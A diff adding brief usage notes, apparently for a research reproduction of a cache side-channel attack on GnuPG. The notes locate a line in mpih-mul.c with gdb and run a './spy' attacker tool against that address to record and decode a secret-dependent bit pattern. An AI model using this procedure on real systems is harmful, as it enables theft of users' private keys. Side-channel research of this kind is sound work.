@@ -1,0 +1,9 @@
+Run the victim gpg program
+
+Figure out the line number: 
+	$ gdb gpg
+	$ info line mpih-mul.c:256
+
+Run the attacker:
+	$ ./spy -a 0x493116 -o output
+	$ ./spy -p 111100000(1100001111) -i output > result
